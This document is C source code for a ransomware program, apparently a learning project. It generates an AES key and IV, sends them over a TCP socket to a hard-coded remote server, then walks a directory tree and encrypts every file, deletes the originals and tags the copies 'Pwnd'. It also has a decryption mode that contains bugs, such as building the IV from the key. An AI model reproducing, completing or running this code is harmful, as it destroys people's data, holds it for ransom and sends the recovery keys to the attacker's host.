#include "ransomlib.h"
#include <dirent.h>

#include <openssl/rand.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define OPENSSL_KEY_SIZE (256 / 8) //car Rand_bytes génère des bytes (octets) et pas bits
#define OPENSSL_IV_SIZE (128 / 8)
#define SIZE 1024

void usage();
int is_encrypted(char *path);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf("Options :\n\n");
    printf("    -h          Display the help of the software.\n");
    printf("    -c          Execute the software in encryption mode.\n");
    printf("                It'll generate a key and iv that'll be sent\n");
	printf("                automatically to the server. This command must\n");
	printf("                be followed by -f.\n");
	printf("    -d          Execute the software in decryption mode.\n");
	printf("                This command must be followed in order by -f, \n");
	printf("                -k and -v arguments.\n");
    printf("    -f          Must be after -c or -d, must be followed by the\n");
    printf("                start folder of the tree to encrypt or decrypt.\n");
	printf("    -k          Must be after -a and his address, must be\n");
    printf("                followed by the right key.\n");
    printf("    -v          Must be after -k and his key, must be\n");
    printf("                followed by the right initialisation vector.\n\n");

    printf("exemples of encrypting :\n\n");
    printf("    -c -f {root folder of the tree}\n\n");

    printf("exemples of listening :\n\n");
    printf("    -d -f {root folder of the tree} -k {key} -v {initialisation vector}\n\n");
}

int is_encrypted(char *path){
	char filename[strlen(path)];
	
	strcpy(filename, path);
	char *token = strtok(filename, ".");

	while(token != NULL){
		if(strcmp(token, "Pwnd") == 0){
			return 1;
		}
		token = strtok(NULL, ".");
	}
	return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
	DIR *dir;
	struct dirent *entry;

	char path[1024];//taille arbitraire
	dir = opendir(name);

	if(de_flag == 't'){
		printf("INFO:LIST_DIR_ENCRYPTING] : Software in testing mod\n");
		return;
	}

	while((entry = readdir(dir)) != NULL){
		snprintf(path, sizeof(path), "%s/%s", name, entry -> d_name);

		if(entry -> d_type == DT_DIR){
			if(strcmp(entry -> d_name, ".") == 0 || strcmp(entry -> d_name, "..") == 0){
				continue;
			}
			listdir(path, iv, key, de_flag);
		}
		//If file and not dir
		else{
			if(de_flag == 'c'){
				if(is_encrypted(path) == 1){
					printf("%s\n", path);
					continue;
				}
				encrypt(key, iv, path);
				remove(path);
			}
			else if(de_flag == 'd'){
				unsigned char key_binary[strlen(key) * 2];
				unsigned char iv_binary[strlen(iv) * 2];

				hexa_to_bytes(key, key_binary, (strlen(key) * 2));
				hexa_to_bytes(key, iv_binary, (strlen(iv) * 2));

				if(is_encrypted(path) == 0){
					continue;
				}
				printf("%s\n", path);
				decrypt(key_binary, iv_binary, path);
				remove(path);
			}
			else{
				printf("Wrong argument of encryption/decryption !\n");
			}
		}
	}

	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv){
	if (!RAND_bytes(key, OPENSSL_KEY_SIZE)) {
    	printf("OpenSSL reports a failure during key generation !");
	}
	if (!RAND_bytes(iv, OPENSSL_IV_SIZE)) {
    	printf("OpenSSL reports a failure during iv generation !");
	}

	bytes_to_hexa(key, pKey, OPENSSL_KEY_SIZE + 1);
	bytes_to_hexa(iv, pIv, OPENSSL_IV_SIZE + 1);

	send_key(pKey, pIv);
}

int send_key(char *pKey, char *pIv){
	int sockid;
	int server_port = 8888;
	char *server_ip = "192.168.1.4";

	sockid = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);

	char msg[((OPENSSL_KEY_SIZE * 2) + (OPENSSL_IV_SIZE * 2) + 3)];
	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);

	connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
	printf("Connected on %s:%d\n", inet_ntoa(server_addr.sin_addr), server_addr.sin_port);

	send(sockid, (const char *)msg, strlen(msg), 0);
}

int main (int argc, char * argv[]){
	unsigned char key[OPENSSL_KEY_SIZE + 1];
	unsigned char iv[OPENSSL_IV_SIZE + 1];

	char pKey[(OPENSSL_KEY_SIZE * 2) + 1];
	char pIv[(OPENSSL_IV_SIZE * 2) + 1];

	const char *name = "test_ransom";

	//possible actions
    if(argc > 1){
        if(strcmp(argv[1], "-c") == 0){
            if(strcmp(argv[2], "-f") == 0){
				generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
				listdir(argv[3], iv, key, 'c');
			}
			else{
				printf("Argument is missing !");
			}
        }
        else if(strcmp(argv[1], "-d") == 0){
            if(strcmp(argv[2], "-f") == 0){
				if(strcmp(argv[4], "-k") == 0){
					if(strcmp(argv[6], "-v") == 0){
						listdir(argv[3], argv[7], argv[5], 'd');
					}
					else{
						printf("Argument is missing !");
					}
				}
				else{
					printf("Argument is missing !");
				}
			}
			else{
				printf("Argument is missing !");
			}
        }
        else if(strcmp(argv[1], "-h") == 0){
            usage();
        }
        else{
            printf("wrong argument gived !\n");
        }
    }
    else{
        printf("non argument gived !\n");
    }
}